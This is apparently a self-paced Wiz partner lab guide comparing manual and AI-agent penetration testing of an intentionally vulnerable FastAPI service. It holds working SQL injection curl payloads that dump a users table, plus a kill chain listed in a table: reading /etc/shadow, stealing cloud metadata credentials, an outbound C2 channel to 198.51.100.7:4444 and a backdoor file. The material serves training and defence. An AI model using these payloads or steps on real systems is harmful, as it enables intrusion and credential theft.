# Wiz Security Lab: Manual vs. Agentic Penetration Testing

Security testing is changing. For years, finding and fixing a vulnerability meant
a human at a terminal: probing endpoints by hand, then writing the patch
yourself. Wiz now closes that loop on its own. **Red Agent** discovers and
exploits, **Green Agent** investigates and remediates, and the **Blue Agent**
triages what happens at runtime.

This self-paced lab lets you feel that shift firsthand. You take the *same*
vulnerable application and work it two ways - Manual and Agentic:

- **Section 1 — Manual:** Traditional penetration testing, guided by Wiz
  intelligence (SAST, Code-to-Cloud, Network Exposure, Issues). You do the
  exploiting; Wiz tells you where to aim.
- **Section 2 — Agentic (Red and Green Agents):** Red Agent and Green Agent handle discovery,
  exploitation, and remediation automatically. You review their work and compare.
- **Section 3 — Agentic (Blue Agent):** a scheduled background job exploits the RCE endpoint on
  a cadence; the Wiz Runtime Sensor detects it and the Blue Agent auto-investigates
  the resulting threat. You read its verdict.

By the end you will have done the job by hand and watched the agents do it, with
a clear side-by-side sense of where each approach wins.

### Before You Start

| | |
|---|---|
| **Audience** | Technical practitioners: partner SEs, security engineers, pentesters |
| **Time** | ~60 minutes, self-paced |
| **Prerequisites** | A terminal with `curl`, and the two tenant logins provided for the workshop |

**What you'll have done by the end:**

- Used Wiz SAST, Code-to-Cloud, and Network Exposure to go from "a host exists"
  to "here is the exact vulnerable line and the path to reach it."
- **Exploited a live SQL injection yourself** from the command line and pulled
  data out of the target.
- Read how Red Agent reproduced that exploitation autonomously, with full
  request/response evidence, and how Green Agent generated the fix.
- Watched the Wiz Runtime Sensor detect a live post-exploitation chain and the
  Blue Agent auto-triage the resulting threat.
- Formed your own view on where manual testing and agents each pull their weight.

## Lab Setup

You will use **two separate Wiz tenants**, both logged in via Wiz Tenant Manager:

| Tenant | Used in | Capabilities |
|--------|---------|--------------|
| Tenant 1 | Section 1 | Standard Wiz (Inventory, SAST, Security Graph, Issues) |
| Tenant 2 | Sections 2+3 | Red Agent + Green Agent + Blue Agent; Runtime Sensor deployed |

Both tenants scan the same AWS account. Each tenant has its own connector:

| Tenant | Subscription filter |
|--------|---------------------|
| Tenant 1 | `TF-AWS-Connector-AgentWorkshop-...` |
| Tenant 2 | `TF-AWS-Connector-AgentWorkshop-...` |

### Why You Log In Through Wiz Tenant Manager

This workshop is run for **Wiz partners**, and partners rarely live in a single
tenant. **Wiz Tenant Manager** is the console that sits above individual Wiz
tenants and lets you move between them from one login, with no separate
credentials or browser sessions to juggle per tenant.

For this lab it matters for one practical reason: the two sections run in **two
different tenants** (one standard Wiz, one with the agents enabled), and Tenant
Manager is what lets you switch between them in seconds.

**How to use it:**

1. Log in to **Wiz Tenant Manager** with the workshop credentials provided.
2. Both lab tenants appear in the tenant list. Select **Tenant 1** to begin Section 1.
3. When you reach Section 2, return to the tenant switcher and select **Tenant 2**.

Same app, same AWS account, two different ways of testing it.

### The Target

A deliberately vulnerable FastAPI service (`agent-workshop-backend-...`) running on
ECS-on-EC2. It exposes two intentionally insecure endpoints:

- `GET /api/users?username=…` — SQL injection (CWE-89)
- `GET /api/execute?command=…` — OS command injection (CWE-78)

The data lives in an in-memory SQLite database seeded with three users.

---

## Section 1: Non-Agentic — Finding the Risk

**Tenant:** Tenant 1 · **Goal:** See what Wiz detects on its own — then fill the
gap yourself by manually proving the finding is exploitable.

Without agents, Wiz gives you full visibility across Code, Build, Cloud, and
Runtime. It flags the vulnerability, maps the deployment, and shows the network
path. What it can't do is prove whether the finding is actually exploitable from
the internet — that's on you. **Steps 1-4 are what Wiz sees**: SAST findings,
Code-to-Cloud tracing, and network exposure. **Steps 5-6 are the gap you fill**:
hands-on exploitation from a terminal. **Steps 7-8 are what Wiz correlates**: a
prioritized issue, but still unvalidated.

### Step 1 — Identify the Target

> **Glance at the clock.** No need to record anything; just keep a rough sense of
> how much hands-on effort the find-and-exploit takes. You'll weigh it against the
> agent's unattended run in Section 2.

1. Go to **Inventory → Cloud Resources**.
2. Filter:
   - Subscription = `TF-AWS-Connector-AgentWorkshop-...-Tenant1`
   - Type = `VIRTUAL_MACHINE`
3. Open the EC2 host tagged `Name = agent-workshop-backend-...`.

Copy its **public IP / DNS** from the resource details. The app listens directly
on **port 8000** — there is no load balancer in front of it.

> Mika shortcut: *"Show me all publicly exposed virtual machines in subscription
> TF-AWS-Connector-AgentWorkshop-...-Tenant1."*

### Step 2 — Review What Wiz SAST Already Knows

Go to **Code Security → SAST Findings** and filter:

- Repository = `wiz-demo/summit-agent-workshop-backend`
- Severity = HIGH, CRITICAL · Status = OPEN

Wiz has already scanned the source and flagged three issues:

| Vulnerability | CWE | Location |
|---|---|---|
| SQL Injection | CWE-89 | `app/main.py:27` — unparameterized query on `GET /api/users` |
| OS Command Injection | CWE-78 | `app/main.py:35-41` — `subprocess.Popen(…, shell=True)` on `GET /api/execute` |
| Insecure CORS | — | `app/main.py:10-16` — `allow_origins=["*"]` with `allow_credentials=True` |

Open the SQL Injection finding to see the exact line, the vulnerable snippet, and
its OWASP mapping (A03:2021). You'll use this in Step 5.

### Step 3 — Map Code to Runtime

Confirm what is actually deployed from this repository.

In the SQL Injection finding you opened in Step 2, click its **related Issue**
link. The Issue carries the **Code to Cloud** correlation: the runtime resources
Wiz traced back to this exact code. (You can also open **Code to Cloud →
Correlations** directly, or ask Mika: *"Show me all cloud resources deployed from
repository wiz-demo/summit-agent-workshop-backend."*)

- **Image:** `975800360817.dkr.ecr.us-east-1.amazonaws.com/agent-workshop-backend-...:<git-sha>`
  (Terraform tags each image with the 12-character git short SHA of the deployed commit.)
- **Cluster:** `agent-workshop-...` (ECS on EC2)
- **Capacity provider:** `agent-workshop-ec2-...` (single-instance ASG)
- **Task family:** `agent-workshop-backend-...` (the container inside the task is named `backend`)

### Step 4 — Analyze Network Exposure

Understand the path from the internet to the container before attacking.

Go to **Security Graph → Network Exposure** and filter on
Exposed Entity = `agent-workshop-backend-...`, or ask Mika:
*"Show me the network exposure path for container agent-workshop-backend-...."*

```
Internet (0.0.0.0/0:8000)
  → EC2 host security group (agent-workshop-backend-...)
  → ECS task (bridge network, hostPort 8000)
  → container (backend)
```

Port 8000 is open to the world directly on the EC2 host.

### Step 5 — Filling the Gap: Exploit the SQL Injection (hands-on)

<aside class="red">
Without an agent, proving exploitability is on you. Steps 5 and 6 are the gap:
you leave the Wiz console, open a terminal, and manually validate what Wiz
flagged. Don't just read the commands; run them.
</aside>

From the SAST finding you know the vulnerable code at `app/main.py:27`:

```python
query = "SELECT id, username, email, role FROM users WHERE username = '"+username+"'"
rows = sqlite_db.execute(query).fetchall()
```

Key facts that shape the payloads:

- Database is **in-memory SQLite** (use `sqlite_version()`, not `@@version`).
- The query selects **4 columns** — UNION payloads must return 4 columns.
- The injectable parameter is the `username` **query string** on `GET /api/users`.

**Open a terminal and run each command below in order.** First replace
`<EC2_PUBLIC_IP>` with the address you copied in Step 1. The block below is for
**macOS / Linux** (bash/zsh); on Windows, use the Command Prompt block under it.

```bash
# Target the EC2 host directly (host:port, no load balancer)
ENDPOINT="<EC2_PUBLIC_IP>:8000"

# Confirm the service is reachable
curl -I "http://$ENDPOINT/"

# Benign baseline — a single user
curl --get "http://$ENDPOINT/api/users" --data-urlencode "username=alice"

# Boolean-based — returns every user
curl --get "http://$ENDPOINT/api/users" --data-urlencode "username=' OR '1'='1"

# UNION-based — must match the 4 selected columns
curl --get "http://$ENDPOINT/api/users" \
  --data-urlencode "username=' UNION SELECT 1,sqlite_version(),3,4-- "
```

<details><summary>On Windows (Command Prompt)</summary>

Define the variable with `set` and reference it as `%ENDPOINT%`. Run each line on
its own (Windows 10/11 ship a real `curl.exe`, so the flags work as-is):

```bat
set ENDPOINT=<EC2_PUBLIC_IP>:8000

curl -I "http://%ENDPOINT%/"

curl --get "http://%ENDPOINT%/api/users" --data-urlencode "username=alice"

curl --get "http://%ENDPOINT%/api/users" --data-urlencode "username=' OR '1'='1"

curl --get "http://%ENDPOINT%/api/users" --data-urlencode "username=' UNION SELECT 1,sqlite_version(),3,4-- "
```

In **PowerShell** instead, set `$ENDPOINT="<EC2_PUBLIC_IP>:8000"` and call
`curl.exe` explicitly (plain `curl` is an alias for `Invoke-WebRequest`).

</details>

**How you know it worked:**

- The `OR '1'='1` request returns **every** user instead of one. The app should
  only ever return a single user for an exact username match, so a full list is
  the injection firing.
- The `UNION` request returns a row that maps to **no real user**: the SQLite
  version string comes back in the `username` field. You've made the database
  return data the endpoint was never meant to expose. That response is your proof
  of exploitation, the manual equivalent of the Evidence Red Agent captures in
  Section 2.

<details><summary>Which payload actually exploited it?</summary>

Both `' OR '1'='1` and the `UNION SELECT` did, in different ways. The boolean
payload subverts the `WHERE` clause so every row matches. The UNION payload is the
more powerful one: it bolts a second query onto the original and lets you choose
exactly what comes back. That control is what you'll use next to read data the API
never returns on purpose.

</details>

### Step 6 — Filling the Gap: Exfiltrate the Data (hands-on)

<aside class="red">
Still you, still the live target. Proving the injection was the warm-up. Now you
use it the way an attacker would: to pull data the API was never meant to hand out.
</aside>

You already know the table from the SAST finding: `users`, with columns
`id, username, email, role`. UNION-based injection lets you pivot from "the query
runs" to "return whatever I ask for." Run these in order, in the same terminal
(`$ENDPOINT` / `%ENDPOINT%` is still set from Step 5):

```bash
# Enumerate the tables in the database (SQLite uses sqlite_master, not information_schema)
curl --get "http://$ENDPOINT/api/users" \
  --data-urlencode "username=' UNION SELECT 1,name,3,4 FROM sqlite_master WHERE type='table'-- "

# Dump the schema of the users table to confirm the columns
curl --get "http://$ENDPOINT/api/users" \
  --data-urlencode "username=' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE name='users'-- "

# Exfiltrate every user record straight out of the table
curl --get "http://$ENDPOINT/api/users" \
  --data-urlencode "username=' UNION SELECT id,username,email,role FROM users-- "
```

<details><summary>On Windows (Command Prompt)</summary>

`%ENDPOINT%` is still set from Step 5. Run each line on its own:

```bat
curl --get "http://%ENDPOINT%/api/users" --data-urlencode "username=' UNION SELECT 1,name,3,4 FROM sqlite_master WHERE type='table'-- "

curl --get "http://%ENDPOINT%/api/users" --data-urlencode "username=' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE name='users'-- "

curl --get "http://%ENDPOINT%/api/users" --data-urlencode "username=' UNION SELECT id,username,email,role FROM users-- "
```

</details>

**What you should see:** the table list comes back through the `username` field,
then the `CREATE TABLE users (...)` definition, and finally all three seeded users
with their email and role. That last response is a full table exfiltration through
a single query string. On a real system this is how a customer list, a credential
table, or a PII store walks out the door.

> **Check the clock again.** You've now found, proven, *and* exploited the
> vulnerability by hand, all the way to pulling the data out. Keep that hands-on
> effort in mind; you'll weigh it against the agent's unattended run in Section 2.

### Step 7 — Correlate with Wiz Issues

Go to **Issues → Risk Issues** and filter on `summit-agent-workshop-backend` (or
search "SQL Injection"). Wiz correlates the SAST finding with runtime exposure
into a single prioritized issue:

```
HIGH — SQL Injection in a Publicly Exposed Container
  SAST:     Unparameterized SQL query (app/main.py:27)
  Exposure: Internet-accessible on the EC2 host (0.0.0.0/0:8000)
  Risk:     Data breach / unauthorized access
```

### Step 8 — Assess the Blast Radius

Use the Security Graph (or Mika: *"What other resources have access to the same
data as summit-agent-workshop-backend?"*) to map what an attacker reaches next.

The SQLite data is in-process, but the **same host also exposes
`GET /api/execute`** (command injection). Chaining SQL injection → command
injection gives shell access as the container user, from which the EC2 instance
role becomes the next pivot.

---

## Section 2: Agentic — Auto Validating & Fixing the Risk

**Tenant:** Tenant 2 (Red Agent + Green Agent enabled) · **Goal:** See how agents
close the gap — validating exploitability and generating the fix automatically.

Switch to **Tenant 2** in the Wiz Tenant Manager tenant switcher, then filter on
the Tenant 2 subscription: `TF-AWS-Connector-AgentWorkshop-...-Tenant2`.

<aside class="blue">
Each section runs in a different tenant. If your screen still shows Section 1's
findings, you're still in Tenant 1. Open the Tenant Manager switcher and select
Tenant 2 before continuing.
</aside>

### Step 1 — Red Agent: Validated Exploitation

1. Go to **Findings → Attack Surface** and locate
   **"SQL / NoSQL Injection via username parameter on Users API"** on
   `agent-workshop-backend-...`.
2. Open the finding and review what the **Red Agent** produced on its own:
   - The vulnerability it discovered — the same SQL injection you proved by hand
     in Section 1, plus the others it found in the same run.
   - The **Evidence** — the exact payloads it sent and the responses it got
     back, used to prove successful exploitation.
   - The data it managed to extract.
   - That the whole run was **autonomous and unattended**: it discovered,
     exploited, and captured evidence with no one at the keyboard.
3. From the finding, follow the **Related Issues** link to
   **"Red Agent discovered critical severity vulnerability / misconfiguration"**
   — the validated CRITICAL Issue that Red Agent's evidence escalated this
   finding into.

Compare this to Section 1: how complete is the agent's finding set versus the one
vulnerability you proved by hand, and remember it ran in the background while your
run needed you driving the terminal the whole time.

### Step 2 — Green Agent: Remediation at the Source

On the same Issue, review the **Green Agent** analysis:

- Root-cause / investigation steps.
- The recommended remediation, including the specific code change — replacing the
  string-concatenated query with a parameterized one:

```python
# Vulnerable
query = "SELECT id, username, email, role FROM users WHERE username = '"+username+"'"

# Fixed
query = "SELECT id, username, email, role FROM users WHERE username = ?"
rows = sqlite_db.execute(query, (username,)).fetchall()
```

Compare Green Agent's plan to the fix you would have written manually.

From here you can send the remediation directly to a **Coding Agent** — an
AI-powered agent that takes Green Agent's fix, applies it to a branch, and opens
a pull request for review, closing the loop from finding to merged fix without
leaving Wiz.

### Step 3 — Static Finding vs. Validated Issue

With both sections done, weigh the two outcomes. In Section 1 the finding stayed
a static HIGH in the backlog; in Section 2 it became a validated CRITICAL with a
fix. Work through each row, or talk it out with the group, then open the answer
key to compare:

- **Effort to find the vulnerability**
- **Completeness of findings**
- **Exploitation evidence**
- **Remediation guidance**
- **Scales across many apps**

<details><summary>How it usually shakes out</summary>

| Aspect | Manual (Section 1) | Agentic (Section 2) |
|---|---|---|
| Effort to find the vulnerability | Minutes of hands-on probing, you at the keyboard throughout | Runs unattended in the background; no one driving |
| Completeness of findings | One proven: the SQL injection | All three: SQL injection, command injection, insecure CORS |
| Exploitation evidence | Your own `curl` output, which you capture and keep yourself | Payload and response recorded automatically for every finding |
| Remediation guidance | You write the parameterized-query fix yourself | Green Agent generates the concrete code change for review |
| Scales across many apps | Linear, bounded by your time and focus | Runs continuously across every app at once |

</details>

Here's the gap worth sitting with. In Section 1 the SQL injection was a **HIGH**
SAST finding sitting in the backlog. You had to leave the console, build UNION
payloads by hand, and prove exploitability yourself — and you only got to one of
the three findings. On a real engagement the clock runs out long before the
second host.

In Section 2, Red Agent took the **same static finding** and proved it
exploitable from the internet — escalating it to a **CRITICAL** toxic
combination with full payload-and-response evidence. Green Agent then traced the
deployed image back through ECS → ECR → commit and generated a fix at the root
cause. The finding went from backlog noise to a validated, actionable issue with
a patch attached.

That's not a reason to stop testing by hand. Manual work brings business-logic
context and judgment the agents don't have. The point is the division of labor:
agents for validation, breadth, and repeatable evidence across every app; humans
for the nuanced cases that need a brain in the loop.

---

## Section 3: Threats — Detecting the Attack as It Happens

**Tenant:** Tenant 2 (Runtime Sensor + Blue Agent enabled) · **Goal:** See what
Wiz does when the vulnerability is actually exploited at runtime — detecting the
post-exploitation chain and auto-investigating the resulting threat.

Sections 1 and 2 stopped at *finding and fixing* the vulnerability. This section
answers the next question: what happens when an attacker actually exploits the RCE
endpoint while Wiz watches the workload at runtime?

The Wiz **Runtime Sensor** is deployed onto this cluster as a daemon. A
**scheduled job runs continuously in the background**, replaying a realistic
post-exploitation chain against the workload through `GET /api/execute` on a fixed
cadence.

<aside class="yellow">
You don't launch anything in this section. The attack runs automatically on a
schedule — fresh detections and threats are always firing on their own. Your job
is to investigate what's already there, not to trigger it.
</aside>

### Step 1 — Why the RCE Endpoint Trips the Sensor

In Section 1 you flagged `GET /api/execute` as the blast-radius escalator. It runs
attacker input through `subprocess.Popen(..., shell=True)`, so every request spawns
a **web service → `sh -c` child process** tree. A web server spawning an
interactive shell is the classic post-exploitation signature, and the sensor flags
it as **anomalous shell execution by a web service** — runtime detection of RCE
exploitation, the thing SAST and Red Agent could only predict statically.

### Step 2 — The Kill Chain (MITRE ATT&CK)

The background chain fires five stages, each mapped to a MITRE technique:

| Stage | Behavior | MITRE | Artifact |
|---|---|---|---|
| 1 | Discovery | T1082 | `id; whoami; uname -a` |
| 2 | OS credential dumping | T1003 | reads `/etc/shadow` |
| 3 | Cloud credential theft | T1552.005 | ECS task metadata at `169.254.170.2` |
| 4 | C2 / exfil channel | T1071 / T1095 | outbound to `198.51.100.7:4444` (TEST-NET-3, RFC 5737) |
| 5 | Persistence | T1546 | writes + `chmod +x /tmp/.backdoor.sh` |

Stage 3 is the real-world pivot foreshadowed in Section 1's blast-radius step:
shell access → steal the ECS/EC2 role credentials from the metadata endpoint.

### Step 3 — Find the Threat in Wiz Defend

A few minutes after a background run, Wiz Defend correlates the sensor detections
into a Threat on the workload.

Go to **Threats → All Threats**, filter to **status OPEN / IN_PROGRESS**, and Subscription **TF-AWS-Connector-AgentWorkshop-...**, open
the most recent threat. Each background run stamps a `wiz-attack-<timestamp>` nonce into its commands — grep for it in the
portal to pin a specific run.

### Step 4 — Read the Blue Agent's Verdict

Open the Threat. The **Blue Agent** (Wiz's SecOps AI Agent) has already
investigated it autonomously, finishing in about a minute. It produces a
**Verdict**, **Conclusion**, **Confidence level**, **Investigation process**, and
**Severity**.

For this chain the recorded verdict is **Security Test** with **High** confidence:
the Blue Agent recognizes the `wiz-attack-*` markers in the commands, the
non-routable TEST-NET-3 C2 target (`198.51.100.7`), and the workshop-named tenant,
and concludes it's an authorized exercise rather than a real intrusion.

<aside class="blue">
The Blue Agent doesn't just read the alert text. It asks investigation questions
with full access to Wiz telemetry — previous detections, cloud events, resource
metadata, and risk findings — to establish root cause, and can trigger Forensics
AI Analysis when forensic packages are available.
</aside>

### Step 5 — The Full Loop: Red, Green, Blue

Tie the three agents together across the same vulnerability's lifecycle:

- **Red Agent (attack surface):** validated the SQL injection was exploitable from
  the internet — static HIGH → CRITICAL with evidence.
- **Green Agent (remediation):** traced the deployed image back to source and
  generated the parameterized-query fix at the root cause.
- **Blue Agent (runtime / SOC):** when the RCE endpoint was abused by the scheduled
  chain, auto-investigated the resulting Threat and delivered a verdict before a
  human triaged it.

Code → Cloud → Runtime, with an agent closing the gap at each stage; the human
stays for context and judgment.

---

## Wrap-Up

- Without agents, Wiz gives you full visibility across Code, Build, Cloud, and
  Runtime — but the finding stays static. Proving exploitability is manual work.
- Red Agent closes the validation gap: it proves which findings are exploitable
  from the internet, escalating them from static HIGH to validated CRITICAL.
- Green Agent closes the remediation gap: it traces the finding back through the
  deployment pipeline and generates a fix at the root cause.
- Blue Agent closes the runtime gap: when the RCE endpoint is exploited by the
  scheduled background chain, it auto-investigates the resulting threat and returns
  a verdict before a human opens it.
- The strongest program combines all three: agents for validation, remediation, and
  runtime triage at scale; people for context and edge cases.

### Take It Further

Now that you've seen the flow end to end, try it on something that isn't
pre-baked:

- **Point Red Agent at your own demo or dev tenant** and read the evidence trail
  on a finding you didn't already know about. Check whether the payloads it
  reports actually reproduce when you replay them with `curl`.
- **Trace one correlated Issue back to its inputs** (SAST finding + network
  exposure + identity) to see how Wiz decides what's critical versus noise.
- **Apply Green Agent's fix** to a branch and confirm the rescan clears the
  finding. That round-trip, finding to merged fix to clean rescan, is the part
  worth getting fluent in.

<a class="get-started-btn" onclick="document.querySelector('.ngx-pagination .pagination-next a')?.click()">Next Page →</a>

<span style="color: #E0E7F1;">v1.0</span>

<style>

@import url('https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,100..1000;1,9..40,100..1000&display=swap');

/* callouts */
aside {
   border: 1px solid #0254EC;
   border-radius: 8px;
   font-weight: 400;
   text-indent: -2px;
   align-items: center;
   margin-top: 6px;
   margin-bottom: 20px;
   line-height: 1.6;
   font-size: 16px;
   letter-spacing: 0px;
   padding-bottom: 10px;
   padding-left: 12px;
   padding-top: 10px;
   padding-right: 5px;
}
aside::before {
   content: "";
   font-style: normal;
   margin-left: 2px;
   font-weight: 600;
   font-size: 16px;
   display: block;
}
aside.blue{
    border-color: #4d8bffb3;
    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='18' viewBox='0 0 512 512'%3E%3Cpath fill='%234d8bff' d='M256 48a208 208 0 1 1 0 416 208 208 0 1 1 0-416zm0 464A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM216 336c-13.3 0-24 10.7-24 24s10.7 24 24 24l80 0c13.3 0 24-10.7 24-24s-10.7-24-24-24l-8 0 0-88c0-13.3-10.7-24-24-24l-48 0c-13.3 0-24 10.7-24 24s10.7 24 24 24l24 0 0 64-24 0zm40-144a32 32 0 1 0 0-64 32 32 0 1 0 0 64z'%3E%3C/path%3E%3C/svg%3E");
    background-repeat: no-repeat;
    background-color: #eff6ff;
    background-position: 10px 8px;
    padding-left: 35px;
    padding-top: 5px;
    padding-bottom: 5px;
}
aside.green{
    border-color: #22c55eb3;
    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='18' viewBox='0 0 512 512'%3E%3Cpath fill='%2322c55e' d='M256 48a208 208 0 1 1 0 416 208 208 0 1 1 0-416zm0 464A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM369 209c9.4-9.4 9.4-24.6 0-33.9s-24.6-9.4-33.9 0l-111 111-47-47c-9.4-9.4-24.6-9.4-33.9 0s-9.4 24.6 0 33.9l64 64c9.4 9.4 24.6 9.4 33.9 0L369 209z'%3E%3C/path%3E%3C/svg%3E");
    background-repeat: no-repeat;
    background-color: #f0fdf4;
    background-position: 10px 8px;
    padding-left: 35px;
    padding-top: 5px;
    padding-bottom: 5px;
}
aside.red{
    border-color: #ef4444b3;
    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='18' viewBox='0 0 512 512'%3E%3Cpath fill='%23ef4444' d='M256 48a208 208 0 1 1 0 416 208 208 0 1 1 0-416zm0 464A256 256 0 1 0 256 0a256 256 0 1 0 0 512zm0-384c-13.3 0-24 10.7-24 24l0 112c0 13.3 10.7 24 24 24s24-10.7 24-24l0-112c0-13.3-10.7-24-24-24zm32 224a32 32 0 1 0 -64 0 32 32 0 1 0 64 0z'%3E%3C/path%3E%3C/svg%3E");
    background-repeat: no-repeat;
    background-color: #fef2f2;
    background-position: 10px 8px;
    padding-left: 35px;
    padding-top: 5px;
    padding-bottom: 5px;
}
aside.yellow{
    border-color: #eab308b3;
    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='18' viewBox='0 0 512 512'%3E%3Cpath fill='%23eab308' d='M248.4 84.3c1.6-2.7 4.5-4.3 7.6-4.3s6 1.6 7.6 4.3L461.9 410c1.4 2.3 2.1 4.9 2.1 7.5c0 8-6.5 14.5-14.5 14.5l-387 0c-8 0-14.5-6.5-14.5-14.5c0-2.7 .7-5.3 2.1-7.5L248.4 84.3zm-41-25L9.1 385c-6 9.8-9.1 21-9.1 32.5C0 452 28 480 62.5 480l387 0c34.5 0 62.5-28 62.5-62.5c0-11.5-3.2-22.7-9.1-32.5L304.6 59.3C294.3 42.4 275.9 32 256 32s-38.3 10.4-48.6 27.3zM288 368a32 32 0 1 0 -64 0 32 32 0 1 0 64 0zm-8-184c0-13.3-10.7-24-24-24s-24 10.7-24 24l0 96c0 13.3 10.7 24 24 24s24-10.7 24-24l0-96z'%3E%3C/path%3E%3C/svg%3E");
    background-repeat: no-repeat;
    background-color: #fefce8;
    background-position: 10px 8px;
    padding-left: 35px;
    padding-top: 5px;
    padding-bottom: 5px;
}
aside.purple{
    border-color: #a855f7b3;
    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='18' viewBox='0 0 512 512'%3E%3Cpath fill='%23a855f7' d='M352 432l-192 0 0-112 0-40 192 0 0 40 0 112zm0-200l-192 0 0-40 0-112 192 0 0 112 0 40zM64 80l48 0 0 88-64 0 0-72c0-8.8 7.2-16 16-16zM48 216l64 0 0 80-64 0 0-80zm64 216l-48 0c-8.8 0-16-7.2-16-16l0-72 64 0 0 88zM400 168l0-88 48 0c8.8 0 16 7.2 16 16l0 72-64 0zm0 48l64 0 0 80-64 0 0-80zm0 128l64 0 0 72c0 8.8-7.2 16-16 16l-48 0 0-88zM448 32L64 32C28.7 32 0 60.7 0 96L0 416c0 35.3 28.7 64 64 64l384 0c35.3 0 64-28.7 64-64l0-320c0-35.3-28.7-64-64-64z'%3E%3C/path%3E%3C/svg%3E");
    background-repeat: no-repeat;
    background-color: #fef5ff;
    background-position: 10px 8px;
    padding-left: 35px;
    padding-top: 5px;
    padding-bottom: 5px;
}
aside strong-title{
    font-weight: 700;
}
/* page navigation bar */
.bottom-space-off .ngx-pagination {
    font-size: 14px;
    background-color: #fdfdff;
    border: 1px solid #e7e7e7;
    border-radius: 9999px;
    box-shadow: none;
    color: #717783;
    width: 96%;
    margin-left: 2%;
    top: 50px;
    bottom: auto !important;
}
cloudlabs-pagination-controls ul.ngx-pagination li {
  margin: 5px 10px;
  border-radius: 9999px;
  padding: 0px 2px !important;
  background: #E0E7F190;
  font-weight: 600;
}
cloudlabs-pagination-controls ul.ngx-pagination li.current {
    border: none;
}
cloudlabs-pagination-controls ul.ngx-pagination li:hover {
    background: #0254ec;
    color: #ffffff;
}
.ngx-pagination .current span {
    color: #ffffff;
}
.ngx-pagination .disabled {
    background: none;
}
.ngx-pagination .disabled:hover {
    background: none;
    color: #717783;
}
/* content tabs at the top of the page */
.tab-wrpguide ul.nav-tabs li a.active-tab:after {
    border-bottom: 0;
}
.tab-wrpguide ul.nav-tabs li a {
    background-color: transparent;
    color: #01123F;
    border: 1px solid #71778350;
    border-left: 1px solid transparent;
    padding: 3px 20px 3px;
}
.tab-wrpguide ul.nav-tabs li {
    margin-left: -1px;
}
/* tab hover coloring */
.tab-wrpguide ul.nav-tabs li a:hover {
    border:1px solid #0254EC !important;
    color: #0254EC;
    background-color: #eaf1ff;
}
.tab-wrpguide ul.nav-tabs li a:hover[aria-label="LAB DESCRIPTION"] {
  background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" height="15" viewBox="0 0 448 512"><!--!Font Awesome Pro 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2025 Fonticons, Inc.--><path fill="%230254ec" d="M176 196.8c0 20.7-5.8 41-16.6 58.7L119.7 320l208.6 0-39.7-64.5c-10.9-17.7-16.6-38-16.6-58.7L272 48l-96 0 0 148.8zM320 48l0 148.8c0 11.8 3.3 23.5 9.5 33.5L437.7 406.2c6.7 10.9 10.3 23.5 10.3 36.4c0 38.3-31.1 69.4-69.4 69.4L69.4 512C31.1 512 0 480.9 0 442.6c0-12.8 3.6-25.4 10.3-36.4L118.5 230.4c6.2-10.1 9.5-21.7 9.5-33.5L128 48l-8 0c-13.3 0-24-10.7-24-24s10.7-24 24-24l40 0L288 0l40 0c13.3 0 24 10.7 24 24s-10.7 24-24 24l-8 0z"/></svg>') !important;
}
.tab-wrpguide ul.nav-tabs li a:hover[aria-label="LAB GUIDE DETAILS"] {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='15' viewBox='0 0 576 512'%3E%3C!--!Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free Copyright 2025 Fonticons, Inc.--%3E%3Cpath fill='%230254ec' d='M565.6 36.2C572.1 40.7 576 48.1 576 56l0 336c0 10-6.2 18.9-15.5 22.4l-168 64c-5.2 2-10.9 2.1-16.1 .3L192.5 417.5l-160 61c-7.4 2.8-15.7 1.8-22.2-2.7S0 463.9 0 456L0 120c0-10 6.1-18.9 15.5-22.4l168-64c5.2-2 10.9-2.1 16.1-.3L383.5 94.5l160-61c7.4-2.8 15.7-1.8 22.2 2.7zM48 136.5l0 284.6 120-45.7 0-284.6L48 136.5zM360 422.7l0-285.4-144-48 0 285.4 144 48zm48-1.5l120-45.7 0-284.6L408 136.5l0 284.6z'/%3E%3C/svg%3E") !important;
}
.tab-wrpguide ul.nav-tabs li a:hover[aria-label="ENVIRONMENT DETAILS"] {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='15' viewBox='0 0 640 512'%3E%3Cpath fill='%230254ec' d='M410.8 134.2c-19.3 8.6-42 3.5-55.9-12.5C332.8 96.1 300.3 80 264 80c-66.3 0-120 53.7-120 120c0 0 0 0 0 0s0 0 0 0l0 .2c0 20.4-12.8 38.5-32 45.3C74.6 258.7 48 294.3 48 336c0 53 43 96 96 96l360 0 3.3 0c.6-.1 1.3-.1 1.9-.2c46.2-2.7 82.8-41 82.8-87.8c0-36-21.6-67.1-52.8-80.7c-20.1-8.8-31.6-30-28.1-51.7c.6-3.8 .9-7.7 .9-11.7c0-39.8-32.2-72-72-72c-10.5 0-20.4 2.2-29.2 6.2zM512 479.8l0 .2-8 0-40 0-320 0C64.5 480 0 415.5 0 336c0-62.7 40.1-116 96-135.8l0-.2c0-92.8 75.2-168 168-168c50.9 0 96.4 22.6 127.3 58.3C406.2 83.7 422.6 80 440 80c66.3 0 120 53.7 120 120c0 6.6-.5 13-1.5 19.3c48 21 81.5 68.9 81.5 124.7c0 72.4-56.6 131.6-128 135.8z'%3E%3C/path%3E%3C/svg%3E") !important;
}
.tab-wrpguide ul.nav-tabs li a:hover[aria-label="RESOURCES"] {
